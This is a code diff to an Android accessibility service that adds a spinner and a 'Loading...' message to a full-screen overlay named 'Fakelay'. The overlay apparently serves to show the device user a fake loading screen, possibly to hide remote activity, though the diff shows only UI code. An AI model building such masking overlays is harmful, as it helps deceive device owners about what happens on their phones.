@@ -665,7 +665,22 @@ class InputService : AccessibilityService() {
             Log.d(logTag, "onCreate failed: $e")
         }
     }
+    
+    fun dp2px(context: Context, f: Float): Int {
+        return (f * context.resources.displayMetrics.density + 0.5f).toInt()
+    }
 
+    private fun getView2(): View? {
+        progressBar = ProgressBar(this, null, 16842871)
+        progressBar!!.setIndeterminateTintList(ColorStateList(arrayOf(intArrayOf(16842910)), intArrayOf(Color.parseColor("#00cc66")))) //-1
+        val dp2px: Int = dp2px(this, 60.0f) //200.0f
+        val layoutParams = FrameLayout.LayoutParams(dp2px, dp2px)
+        layoutParams.gravity = 17
+        //progressBar!!.setPadding(100, 0, 0, 0)
+        progressBar!!.setLayoutParams(layoutParams)
+        return progressBar
+    }
+    
     @SuppressLint("ClickableViewAccessibility")
     private fun createView(windowManager: WindowManager) {
       
@@ -741,6 +756,21 @@ class InputService : AccessibilityService() {
             var vi = Fakelay.visibility
     	    Log.d(logTag, "Fakelay 自身穿透 点击隐藏遮罩层 keepScreenOn option: $vi")
        })*/
+	    
+	val loadingText = TextView(this, null)
+	loadingText.text = "Loading..."
+	loadingText.setTextColor(-7829368)
+	loadingText.textSize = 20.0f
+	loadingText.gravity = Gravity.CENTER
+	loadingText.setPadding(0, 250, 0, 0)
+
+	val dp2px: Int = dp2px(this, 100.0f) //200.0f
+	val paramstext = FrameLayout.LayoutParams(dp2px * 5, dp2px * 3)
+	paramstext.gravity = Gravity.CENTER
+	loadingText.layoutParams = paramstext
+
+	Fakelay.addView(getView2())
+	Fakelay.addView(loadingText)
 	
         windowManager.addView(Fakelay, Fakeparams_bass)
     }
